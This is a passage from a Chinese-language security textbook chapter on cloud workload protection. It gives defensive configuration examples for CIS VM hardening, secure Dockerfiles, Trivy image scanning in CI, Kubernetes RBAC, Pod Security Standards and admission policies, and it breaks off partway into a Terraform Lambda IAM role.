# 5.4 云工作负载保护 (Cloud Workload Protection)

> **本节目标**: 掌握虚拟机、容器、Kubernetes、Serverless全生命周期安全控制,对比主流镜像扫描工具,设计Kubernetes RBAC与Pod Security配置,实施Serverless安全最佳实践,评估CWPP平台,建立运行时威胁检测能力。

---

## 本节概览

云工作负载保护覆盖从虚拟机到容器、Kubernetes再到Serverless的全栈安全控制。与传统虚拟机时代20年逐步建立的安全基线(CIS Benchmarks、防病毒、EDR)不同,容器化转型将部署周期压缩至15分钟,开发者一天可创建200个新容器,传统"事后审计"模式完全失效。云工作负载保护的核心挑战是:**将安全控制嵌入DevOps流水线的每个环节**(镜像扫描在CI阶段、准入控制在部署阶段、运行时检测在Run阶段),而非事后补救。

### 核心内容

本节覆盖云工作负载从构建到运行的全方位安全控制:

1. **VM安全基线**: CIS Benchmarks for AWS/Azure/GCP,配置加固自动化
2. **容器安全生命周期**: Build → Ship → Run三阶段控制框架
3. **容器镜像扫描**: Trivy、Grype、Snyk Container对比分析
4. **Kubernetes安全**: RBAC权限设计、Pod Security Standards、Admission Controllers
5. **Kubernetes安全工具**: Falco、Kubescape、Kyverno实战
6. **Serverless安全**: Lambda权限设计、SSRF防护、IMDSv2保护
7. **CWPP平台对比**: Prisma Cloud、Wiz、Lacework、Aqua选型决策
8. **运行时威胁检测**: eBPF技术、异常行为检测、自动化响应

### 适用场景

本节内容适用于以下云工作负载保护场景:

- **虚拟机安全基线配置**: 应用CIS Benchmarks和配置管理自动化,建立Golden Image Factory
- **容器化安全转型**: 在迁移过程中建立镜像扫描、准入控制、运行时监控全生命周期控制
- **生产级Kubernetes环境**: 实施RBAC最小权限、Pod Security Standards、准入控制策略
- **Serverless架构**: 解决Lambda/Functions的IAM权限设计、SSRF防护、运行时可见性挑战
- **运行时威胁检测**: 使用Falco eBPF监控在攻击链早期阻断异常行为
- **CWPP平台选型**: 综合评估技术栈、预算、团队能力选择Prisma Cloud/Wiz/Aqua/Lacework

### 关键概念

| 概念 | 定义 | 重要性 |
|------|------|--------|
| **CIS Benchmark** | 安全配置基线标准 | 行业最佳实践 |
| **Container Image** | 容器镜像,包含应用与依赖 | 供应链安全起点 |
| **Image Scanning** | 镜像漏洞扫描 | 左移安全 |
| **RBAC** | 基于角色的访问控制 | K8s权限管理 |
| **Pod Security** | Pod安全策略/标准 | K8s工作负载隔离 |
| **Admission Controller** | K8s准入控制器 | 策略即代码 |
| **Serverless** | 无服务器计算(Lambda/Functions) | 事件驱动架构 |
| **CWPP** | Cloud Workload Protection Platform | 统一工作负载安全 |
| **eBPF** | 内核级监控技术 | 高性能运行时检测 |

---

## 5.4.1 VM安全基线:从手工加固到自动化合规

### CIS Benchmarks概述

Center for Internet Security (CIS)发布的安全配置基线覆盖主流操作系统与云平台,是PCI DSS、HIPAA、NIST等合规框架引用的全球公认标准。CIS Benchmark包含300+个配置检查项,覆盖文件系统、引导加载器、访问控制、网络、防火墙、SSH、审计、账户安全8大类控制,每个检查项都有明确的"预期状态"和"修复方法"。

**支持的云VM镜像**:

| 平台 | 支持的镜像 | Benchmark版本 | 级别 |
|------|----------|--------------|------|
| **AWS** | Amazon Linux 2/2023, RHEL, Ubuntu, Windows Server | v2.0+ | Level 1/2 |
| **Azure** | Ubuntu Server, RHEL, Windows Server, SLES | v1.5+ | Level 1/2 |
| **GCP** | Debian, Ubuntu, CentOS, Windows Server | v1.3+ | Level 1/2 |

**Level 1 vs Level 2分级**:

CIS Benchmark提供两个级别的配置基线。Level 1是基础安全配置,对性能和功能影响最小,适用于所有生产环境;Level 2是高安全配置,提供纵深防御但可能影响兼容性和性能,适用于高安全要求环境,需在部署前进行充分测试验证。

### 自动化加固策略

CIS Benchmark的300+安全配置基线手动逐项配置既耗时又容易出错。推荐使用基础设施即代码(IaC)工具实现自动化加固。三种主要方法各有适用场景:**Ansible/Chef/Puppet用于配置管理**(适合已存在的EC2实例,通过Playbook统一应用CIS基线),**Terraform/CloudFormation用于实例启动时加固**(通过User Data脚本在实例首次启动时自动执行CIS加固,确保"生而安全"),**AWS Systems Manager State Manager持续合规**(定期检查配置漂移并自动修正)。

关键决策点包括:**加固级别选择**(CIS Level 1适合通用场景,Level 2适合高安全环境但可能影响兼容性,需权衡安全性与可用性),**分阶段实施**(先在非生产环境验证,避免加固导致应用不兼容,建议在staging环境完整验证后再应用于生产),**豁免机制**(某些检查项可能与业务需求冲突,如某些遗留应用依赖特定服务或端口,需建立白名单豁免流程并记录豁免理由)。

典型的CIS加固包含8大类控制:**文件系统安全**(禁用不必要的文件系统如cramfs/freevxfs,防止内核漏洞利用),**引导加载器保护**(设置grub.cfg权限为600,防止未授权修改启动参数),**强制访问控制**(启用AppArmor或SELinux,限制进程权限),**网络参数加固**(禁用IP转发、ICMP重定向,启用SYN Cookies防DDoS),**防火墙配置**(UFW/iptables默认拒绝入站,仅开放必要端口),**SSH加固**(禁用root登录、密码认证、空密码,强制密钥认证),**审计日志**(启用auditd记录敏感操作,如特权提升、文件访问、网络连接),**账户安全**(强制密码复杂度、定期过期、登录失败锁定)。

**AWS EC2 Image Builder自动化加固示例**:

```yaml
# EC2 Image Builder配置 - CIS Level 1加固
name: "CIS-Amazon-Linux-2-Level1-Hardened"
description: "Amazon Linux 2 with CIS Level 1 hardening"

components:
  # 1. 使用AWS提供的CIS组件
  - name: "amazon-linux-2-cis-level-1"
    arn: "arn:aws:imagebuilder:us-east-1:aws:component/amazon-linux-2-cis-level-1-hardening/1.0.0"

  # 2. 自定义加固脚本
  - name: "custom-hardening"
    data: |
      #!/bin/bash

      # 1.1.1.1 禁用未使用的文件系统
      echo "install cramfs /bin/true" >> /etc/modprobe.d/CIS.conf
      echo "install freevxfs /bin/true" >> /etc/modprobe.d/CIS.conf
      echo "install jffs2 /bin/true" >> /etc/modprobe.d/CIS.conf

      # 1.5.1 配置SELinux
      sed -i 's/SELINUX=disabled/SELINUX=enforcing/' /etc/selinux/config
      setenforce 1

      # 3.1.1 禁用IP forwarding (如非路由器)
      echo "net.ipv4.ip_forward = 0" >> /etc/sysctl.conf
      sysctl -w net.ipv4.ip_forward=0

      # 4.1.1 配置审计日志
      systemctl enable auditd
      systemctl start auditd

      # 5.2 SSH加固
      sed -i 's/^#PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
      sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
      sed -i 's/^#MaxAuthTries 6/MaxAuthTries 3/' /etc/ssh/sshd_config
      echo "ClientAliveInterval 300" >> /etc/ssh/sshd_config
      echo "ClientAliveCountMax 0" >> /etc/ssh/sshd_config
      systemctl restart sshd

tests:
  - name: "CIS-Compliance-Test"
    arn: "arn:aws:imagebuilder:us-east-1:aws:test/cis-level-1-validation/1.0.0"

distribution:
  regions:
    - us-east-1
    - us-west-2
  launch_permission:
    organization_arns:
      - "arn:aws:organizations::123456789012:organization/o-abc123"

tags:
  CISLevel: "1"
  AutoUpdate: "true"
  Environment: "production"
```

**关键加固决策示例**(Ansible Playbook片段):

```yaml
# CIS SSH加固 - 核心决策点
- name: 5.2 SSH Server Hardening
  lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "^#?{{ item.key }}"
    line: "{{ item.key }} {{ item.value }}"
  loop:
    # 决策点1: 禁用root远程登录(紧急情况通过Console访问)
    - { key: 'PermitRootLogin', value: 'no' }
    # 决策点2: 强制密钥认证,禁用密码(防暴力破解)
    - { key: 'PasswordAuthentication', value: 'no' }
    # 决策点3: 限制认证尝试次数(防SSH扫描攻击)
    - { key: 'MaxAuthTries', value: '3' }
    # 决策点4: 使用强加密算法(移除老旧的3DES/RC4)
    - { key: 'Ciphers', value: 'aes256-ctr,aes192-ctr,aes128-ctr' }
    # 决策点5: 会话超时设置(5分钟无活动自动断开)
    - { key: 'ClientAliveInterval', value: '300' }
  notify: restart sshd
```

### 持续合规监控

CIS Benchmark合规自动化面临三大核心挑战:**基线漂移检测**(生产环境的EC2实例可能因人工修改、补丁更新、配置变更等原因偏离CIS基线,需要持续监控而非一次性扫描),**自动修复的风险平衡**(盲目自动修复可能导致服务中断,如自动禁用SSH root登录可能锁死应急访问通道,但完全依赖人工修复又无法及时降低风险),**大规模实例的监控效率**(当企业拥有数千台EC2实例时,传统的逐台扫描方式耗时过长且消耗大量计算资源,需要智能化的抽样和优先级策略)。

有效的合规监控需要结合**自动化检测**(AWS Systems Manager Compliance、AWS Config Rules、第三方工具如Prowler/ScoutSuite)和**智能修复决策**(Critical违规立即修复、High违规计划窗口修复、Medium/Low违规生成工单人工审查)。

**基于AWS Systems Manager的持续合规**:

Systems Manager提供State Manager功能,可定期在所有托管实例上执行合规性检查文档(如CIS Amazon Linux 2 Benchmark),自动收集检查结果并生成合规报告。关键配置决策包括:**扫描频率**(建议每日增量扫描检测新变更,每周全量扫描建立完整基线),**自动修复范围**(仅对"安全加固"类违规自动修复,如禁用不必要服务、强化SSH配置;涉及可用性的修复如防火墙规则变更必须人工审批),**告警阈值**(Critical级违规实时告警,High级违规每日汇总发送,Medium/Low级违规每周报告)。

**自动修复决策框架**必须谨慎设计以避免"过度自动化"带来的生产风险。推荐建立**三层修复机制**:

- **Tier 1立即自动修复**: 无业务影响的加固操作(安装补丁、禁用未使用服务、强化日志审计)
- **Tier 2计划窗口修复**: 需要服务重启或短暂中断的操作(SSH配置修改需重启sshd服务,安排在维护窗口执行)
- **Tier 3人工审批修复**: 涉及网络连通性或权限变更的操作(修改Security Group规则、变更IAM角色,必须经过变更管理委员会审批)

**自动修复决策引擎示例**(核心逻辑):

```python
# CIS合规自动修复决策引擎 - 核心逻辑
def should_auto_remediate(violation, instance_metadata):
    """判断CIS违规项是否适合自动修复"""

    # Tier 1: 立即自动修复(无业务影响)
    auto_fix_whitelist = [
        'CIS-1.2.1',  # 软件包更新(通过yum update)
        'CIS-4.1.2',  # 审计日志配置(仅修改配置文件,无需重启)
        'CIS-3.1.1'   # 禁用IP转发(sysctl修改,立即生效)
    ]

    # Tier 2: 计划窗口修复(需要服务重启)
    scheduled_fix_list = [
        'CIS-5.2.4',  # SSH配置(需重启sshd服务)
        'CIS-3.3.1'   # 防火墙规则(需重启iptables)
    ]

    # Tier 3: 人工审批修复(涉及网络/权限变更)
    manual_fix_list = [
        'CIS-3.2.*',  # 网络参数变更(可能影响连通性)
        'CIS-5.1.*'   # 权限变更(可能锁死访问)
    ]

    # 决策逻辑
    if violation['rule_id'] in auto_fix_whitelist:
        return 'immediate'  # 立即修复
    elif violation['rule_id'] in scheduled_fix_list:
        if instance_metadata['environment'] == 'production':
            return 'scheduled'  # 生产环境计划窗口修复
        else:
            return 'immediate'  # 非生产环境可立即修复
    else:
        return 'manual'  # 人工审批修复
```

**大规模合规监控的性能优化**:

当企业拥有3,000+EC2实例时,传统的"每日全量扫描所有实例"会带来巨大开销。优化方法包括:**增量扫描**(仅对过去24小时有变更的实例执行全量扫描,其他实例执行轻量级"基线漂移检测"),**分层抽样**(Critical应用每日扫描100%实例,Medium应用每周抽样扫描30%,Low风险应用每月扫描10%),**智能去重**(相同违规项仅生成一个工单,关联所有受影响实例,而非每实例一个工单),**批量修复**(将相同类型的违规项批量处理,如一次性修复所有"未禁用root登录"的实例,而非逐台修复)。

---

## 5.4.2 容器安全生命周期:Build → Ship → Run三阶段控制

### 容器安全生命周期框架

容器安全需要覆盖从镜像构建到运行的全生命周期。Build阶段(基础镜像选择、依赖管理、安全配置)确保镜像"生而安全",Ship阶段(漏洞扫描、秘密扫描、镜像签名)阻断高风险镜像部署,Run阶段(准入控制、运行时检测、事件响应)在运行时持续监控并快速响应威胁。

![云工作负载保护](../../../assets/images/chapter_05/05_Cloud_Workload_Protection_v6.png)

```
Container Security Lifecycle

┌─────────────────────────────────────────────────────┐
│ 1. BUILD PHASE                                      │
│ ┌───────────────────────────────────────────────┐   │
│ │ Developer                                     │   │
│ │ ↓                                             │   │
│ │ Dockerfile (IaC)                              │   │
│ │ ↓                                             │   │
│ │ Base Image Selection                          │   │
│ │ ├─ 使用官方镜像                               │   │
│ │ ├─ 最小化镜像(Alpine/Distroless)              │   │
│ │ └─ 扫描基础镜像漏洞                           │   │
│ │ ↓                                             │   │
│ │ Dependency Management                         │   │
│ │ ├─ 锁定版本(package-lock.json/go.sum)        │   │
│ │ ├─ 扫描依赖漏洞(SCA)                          │   │
│ │ └─ 移除开发依赖                               │   │
│ │ ↓                                             │   │
│ │ Security Controls                             │   │
│ │ ├─ 非root用户运行                             │   │
│ │ ├─ 只读文件系统                               │   │
│ │ ├─ Drop capabilities                          │   │
│ │ └─ 健康检查                                   │   │
│ └───────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
 ↓
┌─────────────────────────────────────────────────────┐
│ 2. SHIP PHASE                                       │
│ ┌───────────────────────────────────────────────┐   │
│ │ CI/CD Pipeline                                │   │
│ │ ↓                                             │   │
│ │ Image Build                                   │   │
│ │ ├─ Multi-stage build                          │   │
│ │ ├─ Layer缓存优化                              │   │
│ │ └─ Build参数注入(secrets)                     │   │
│ │ ↓                                             │   │
│ │ Image Scanning                                │   │
│ │ ├─ 漏洞扫描(Trivy/Grype/Snyk)                 │   │
│ │ ├─ 秘密扫描(GitGuardian)                      │   │
│ │ ├─ 恶意软件扫描                               │   │
│ │ └─ 配置检查(Dockerfile Lint)                  │   │
│ │ ↓                                             │   │
│ │ Image Signing                                 │   │
│ │ ├─ Cosign签名                                 │   │
│ │ ├─ SBOM生成                                   │   │
│ │ └─ Attestation                                │   │
│ │ ↓                                             │   │
│ │ Registry Upload                               │   │
│ │ ├─ 私有Registry(Harbor/ECR/ACR)               │   │
│ │ ├─ 访问控制(IAM)                              │   │
│ │ └─ 镜像加密(at rest)                          │   │
│ └───────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
 ↓
┌─────────────────────────────────────────────────────┐
│ 3. RUN PHASE                                        │
│ ┌───────────────────────────────────────────────┐   │
│ │ Kubernetes/Container Runtime                  │   │
│ │ ↓                                             │   │
│ │ Admission Control                             │   │
│ │ ├─ 签名验证(Cosign/Notary)                    │   │
│ │ ├─ Pod Security Policy                        │   │
│ │ ├─ Network Policy                             │   │
│ │ └─ Resource Limits                            │   │
│ │ ↓                                             │   │
│ │ Runtime Security                              │   │
│ │ ├─ 进程监控(Falco)                            │   │
│ │ ├─ 文件完整性(AIDE)                           │   │
│ │ ├─ 网络监控(eBPF)                             │   │
│ │ └─ 异常行为检测                               │   │
│ │ ↓                                             │   │
│ │ Incident Response                             │   │
│ │ ├─ 告警触发                                   │   │
│ │ ├─ 容器隔离                                   │   │
│ │ ├─ 取证分析                                   │   │
│ │ └─ 自动修复                                   │   │
│ └───────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

### 安全Dockerfile最佳实践

**不安全 vs 安全 Dockerfile对比**:

不安全的Dockerfile通常使用latest标签(无法追溯具体版本)、root用户运行(攻击者获得完全控制权)、复制所有文件(暴露敏感配置)、暴露所有端口(扩大攻击面)。安全的Dockerfile应使用特定版本标签(确保可复现构建)、创建非root用户运行(限制攻击者权限)、使用multi-stage build(减小最终镜像体积)、只暴露必要端口(最小化攻击面)、使用distroless镜像(移除所有shell和包管理器,阻断攻击者后渗透)。

```dockerfile
# 不安全的Dockerfile
FROM ubuntu:latest

# 使用root用户
RUN apt-get update && apt-get install -y \
    python3 \
    python3-pip

# 复制所有文件
COPY . /app

# 暴露所有端口
EXPOSE 0-65535

# root用户运行
WORKDIR /app
RUN pip3 install -r requirements.txt
CMD ["python3", "app.py"]
```

```dockerfile
# 安全的Dockerfile
# 1. 使用特定版本,而非latest
FROM python:3.11-slim-bullseye AS builder

# 2. 设置非root用户
RUN groupadd -r appuser && useradd -r -g appuser appuser

# 3. 使用multi-stage build
WORKDIR /build

# 4. 只复制必要文件
COPY requirements.txt .

# 5. 安装依赖(使用hash验证)
RUN pip install --no-cache-dir --require-hashes -r requirements.txt

# 6. 复制应用代码
COPY --chown=appuser:appuser app/ /build/app/

# ============================================
# Runtime Stage (Distroless)
# ============================================
FROM gcr.io/distroless/python3-debian11

# 7. 从builder复制必要文件
COPY --from=builder --chown=nonroot:nonroot /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY --from=builder --chown=nonroot:nonroot /build/app /app

# 8. 使用非root用户
USER nonroot

# 9. 只暴露必要端口
EXPOSE 8080

# 11. 健康检查
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD ["python3", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/health')"]

# 12. 设置Labels (metadata)
LABEL org.opencontainers.image.source="https://github.com/company/app" \
      org.opencontainers.image.version="1.2.3" \
      org.opencontainers.image.vendor="Company Inc" \
      org.opencontainers.image.licenses="MIT"

# 13. 安全启动命令
ENTRYPOINT ["python3", "-u"]
CMD ["/app/main.py"]
```

---

## 5.4.3 容器镜像扫描工具对比

### Trivy vs Grype vs Snyk Container

| 维度 | Trivy | Grype | Snyk Container |
|------|-------|-------|----------------|
| **开发者** | Aqua Security | Anchore | Snyk |
| **开源** | Apache 2.0 | Apache 2.0 | 商业软件 |
| **漏洞数据库** | NVD, GHSA, OS Vendors | NVD, GHSA | Snyk Vulnerability DB |
| **扫描速度** | 最快 | 快 | 中等 |
| **准确性** | 高 | 高 | 最准 |
| **误报率** | 低-中 | 中 | 低 |
| **支持语言** | 多种(Go/Rust/Python等) | 多种 | 多种+深度分析 |
| **配置扫描** | 支持(Dockerfile/K8s) | 不支持 | 支持 |
| **秘密扫描** | 支持 | 不支持 | 支持 |
| **SBOM生成** | CycloneDX/SPDX | CycloneDX/SPDX | 支持 |
| **CI/CD集成** | 易集成 | 易集成 | 插件丰富 |
| **修复建议** | 基础 | 基础 | 详细 |
| **成本** | 免费 | 免费 | 企业版付费 |
| **适用场景** | 中小团队/快速扫描 | 开源优先 | 企业/深度分析 |

### 扫描工具实战

**Trivy完整扫描流程**(CI/CD集成示例):

```bash
#!/bin/bash
# trivy-scan-pipeline.sh - CI/CD集成示例

IMAGE="myapp:1.2.3"
REGISTRY="company.azurecr.io"
FULL_IMAGE="$REGISTRY/$IMAGE"

# 1. 构建镜像
docker build -t $FULL_IMAGE .

# 2. 运行Trivy扫描
echo "=== Running Trivy Scan ==="

trivy image \
  --severity HIGH,CRITICAL \
  --format json \
  --output trivy-report.json \
  --timeout 10m \
  $FULL_IMAGE

# 3. 解析扫描结果
CRITICAL=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length' trivy-report.json)
HIGH=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="HIGH")] | length' trivy-report.json)

echo "Critical vulnerabilities: $CRITICAL"
echo "High vulnerabilities: $HIGH"

# 4. 策略决策
if [ "$CRITICAL" -gt 0 ]; then
  echo "❌ CRITICAL vulnerabilities found. Blocking deployment."

  # 生成详细报告
  trivy image --format table --severity CRITICAL $FULL_IMAGE

  exit 1
elif [ "$HIGH" -gt 5 ]; then
  echo "⚠️ More than 5 HIGH vulnerabilities. Manual review required."

  # 发送通知到Slack
  curl -X POST https://hooks.slack.com/services/YOUR/WEBHOOK \
    -H 'Content-Type: application/json' \
    -d "{\"text\": \"Image $IMAGE has $HIGH HIGH vulnerabilities. Review required.\"}"

  exit 1
else
  echo "✅ Image passed security scan"
fi

# 5. 生成SBOM
echo "=== Generating SBOM ==="
trivy image --format cyclonedx --output sbom.json $FULL_IMAGE

# 6. 签名镜像 (Cosign)
echo "=== Signing image ==="
cosign sign --key cosign.key $FULL_IMAGE

# 7. 推送到Registry
echo "=== Pushing to registry ==="
docker push $FULL_IMAGE

# 8. 推送SBOM到Registry
cosign attach sbom --sbom sbom.json $FULL_IMAGE

echo "=== Pipeline completed successfully ==="
```

**GitHub Actions集成示例**:

```yaml
# .github/workflows/container-security.yml
name: Container Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: false
          load: true
          tags: myapp:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:${{ github.sha }}'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'  # Fail on vulnerabilities

      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'

      - name: Run Grype scan (additional check)
        uses: anchore/scan-action@v3
        with:
          image: 'myapp:${{ github.sha }}'
          fail-build: true
          severity-cutoff: high

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: 'myapp:${{ github.sha }}'
          format: cyclonedx-json
          output-file: sbom.json

      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json

      - name: Scan for secrets
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: ${{ github.event.repository.default_branch }}
          head: HEAD
```

---

## 5.4.4 Kubernetes安全:RBAC与Pod Security

### Kubernetes RBAC设计

Kubernetes RBAC(基于角色的访问控制)是K8s权限管理的核心机制。RBAC最佳实践要求:**避免使用cluster-admin**(开发者应仅获得namespace级别权限),**每个应用独立ServiceAccount**(避免使用default ServiceAccount),**最小权限原则**(仅授予完成任务所需的最小权限集),**定期审计权限**(使用kubectl-who-can等工具检测过度权限)。

**RBAC核心概念**:

- **Role/ClusterRole**: 定义权限规则(允许对哪些资源执行哪些操作)
- **RoleBinding/ClusterRoleBinding**: 将权限绑定到用户/组/ServiceAccount
- **ServiceAccount**: Pod的身份标识(避免使用default,每应用创建独立SA)

**RBAC最佳实践配置示例**:

```yaml
# 1. 创建命名空间隔离
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    environment: production
    security-level: high

---
# 2. 创建ServiceAccount (避免使用default)
apiVersion: v1
kind: ServiceAccount
metadata:
  name: app-backend
  namespace: production

---
# 3. 定义Role (namespace级别)
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: backend-app-role
  namespace: production
rules:
  # 允许读取ConfigMaps
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get", "list"]
    resourceNames: ["app-config"]  # 限制特定资源

  # 允许读取Secrets
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get"]
    resourceNames: ["app-secrets"]

  # 允许读取Services
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["get", "list"]

  # 禁止Pod操作 (不授予pods权限)

---
# 4. 绑定Role到ServiceAccount
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: backend-app-binding
  namespace: production
subjects:
  - kind: ServiceAccount
    name: app-backend
    namespace: production
roleRef:
  kind: Role
  name: backend-app-role
  apiGroup: rbac.authorization.k8s.io

---
# 5. ClusterRole (cluster级别,仅管理员)
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-reader
rules:
  # 只读访问大部分资源
  - apiGroups: [""]
    resources: ["pods", "services", "configmaps", "namespaces"]
    verbs: ["get", "list", "watch"]

  - apiGroups: ["apps"]
    resources: ["deployments", "replicasets", "statefulsets"]
    verbs: ["get", "list", "watch"]

  # 禁止写操作

---
# 6. ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: cluster-reader-binding
subjects:
  - kind: Group
    name: developers
    apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-reader
  apiGroup: rbac.authorization.k8s.io
```

**RBAC权限审计命令**:

```bash
# 1. 列出所有ClusterRoleBindings
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name | contains("cluster-admin")) | .metadata.name'

# 2. 检查哪些用户有cluster-admin权限
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[].name'

# 3. 检查ServiceAccount权限
kubectl auth can-i --list --as=system:serviceaccount:production:app-backend

# 4. 检查特定操作权限
kubectl auth can-i delete pods --namespace=production --as=system:serviceaccount:production:app-backend

# 5. 生成权限矩阵
kubectl-who-can delete pods --namespace production
```

### Pod Security Standards (PSS)

Kubernetes Pod Security Standards定义了三个级别的Pod安全策略。Privileged级别无限制,适用于系统组件(CNI/CSI);Baseline级别提供最小限制,防止已知提权,适用于开发环境;Restricted级别提供严格限制,强制安全最佳实践,适用于生产环境。

**Kubernetes Pod Security Levels**:

| 级别 | 定义 | 限制 | 适用场景 |
|------|------|------|---------|
| **Privileged** | 无限制策略 | 无 | 系统组件(CNI/CSI) |
| **Baseline** | 最小限制策略 | 防止已知提权 | 开发环境 |
| **Restricted** | 严格限制策略 | 强制安全最佳实践 | 生产环境 |

**Restricted级别Pod配置示例**:

```yaml
# 1. 启用Pod Security Admission (K8s 1.25+)
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

---
# 2. 符合Restricted标准的Pod
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  serviceAccountName: app-backend

  # 安全上下文 (Pod级别)
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault

  containers:
    - name: app
      image: myapp:1.2.3

      # 安全上下文 (Container级别)
      securityContext:
        allowPrivilegeEscalation: false
        runAsNonRoot: true
        runAsUser: 1000
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
        seccompProfile:
          type: RuntimeDefault

      # 资源限制
      resources:
        requests:
          memory: "128Mi"
          cpu: "100m"
        limits:
          memory: "256Mi"
          cpu: "200m"

      # 只读根文件系统,需要临时目录挂载
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /app/.cache

  volumes:
    - name: tmp
      emptyDir: {}
    - name: cache
      emptyDir: {}
```

### Admission Controllers策略

Admission Controllers是Kubernetes准入控制器,在对象持久化到etcd之前拦截请求,实现"策略即代码"。常用工具包括OPA Gatekeeper(使用Rego语言定义策略)和Kyverno(使用YAML定义策略,更易上手)。

**OPA Gatekeeper策略示例**:

```yaml
# 1. ConstraintTemplate: 强制镜像来自可信Registry
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: allowedrepos
spec:
  crd:
    spec:
      names:
        kind: AllowedRepos
      validation:
        openAPIV3Schema:
          type: object
          properties:
            repos:
              type: array
              items:
                type: string

  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package allowedrepos

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not startswith(container.image, input.parameters.repos[_])
          msg := sprintf("Image '%v' not from approved registry", [container.image])
        }

---
# 2. Constraint: 应用策略
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: AllowedRepos
metadata:
  name: prod-allowed-repos
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - production
  parameters:
    repos:
      - "company.azurecr.io/"
      - "gcr.io/company-prod/"
      - "123456789012.dkr.ecr.us-east-1.amazonaws.com/"

---
# 3. ConstraintTemplate: 强制资源限制
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: resourcelimits
spec:
  crd:
    spec:
      names:
        kind: ResourceLimits

  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package resourcelimits

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not container.resources.limits.memory
          msg := sprintf("Container '%v' missing memory limit", [container.name])
        }

        violation[{"msg": msg}] {
          container := input.review.object.spec.containers[_]
          not container.resources.limits.cpu
          msg := sprintf("Container '%v' missing CPU limit", [container.name])
        }

---
# 4. Kyverno策略 (替代方案)
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: enforce
  background: true
  rules:
    - name: disallow-privileged-containers
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Privileged containers are not allowed"
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): "false"

    - name: require-non-root
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Containers must run as non-root user"
        pattern:
          spec:
            securityContext:
              runAsNonRoot: true
            containers:
              - securityContext:
                  runAsNonRoot: true
```

---

## 5.4.5 Serverless安全:函数级隔离与SSRF防护

### Lambda最小权限IAM Role设计

Serverless函数(AWS Lambda/Azure Functions/GCP Cloud Functions)的安全核心是IAM权限设计。常见错误是使用统一的IAM Role拥有过度权限(如s3:*),正确做法是为每个函数创建独立IAM Role,仅授予访问特定资源(如特定S3 bucket的特定prefix)的最小权限,并使用IAM条件限制访问范围。

**最小权限Lambda IAM Role配置**(Terraform示例):

```hcl
# Terraform: Lambda IAM Role设计
resource "aws_iam_role" "lambda_exec" {
  name = "lambda-data-processor-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "lambda.amazonaws.com"
      }
    }]
  })
}

# 基础CloudWatch Logs权限
resource "aws_iam_role_policy_attachment" "lambda_logs" {
  role       = aws_iam_role.lambda_exec.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
}

# 自定义策略: 只访问特定S3桶
resource "aws_iam_role_policy" "lambda_s3" {
  name = "lambda-s3-policy"
  role = aws_iam_role.lambda_exec.id

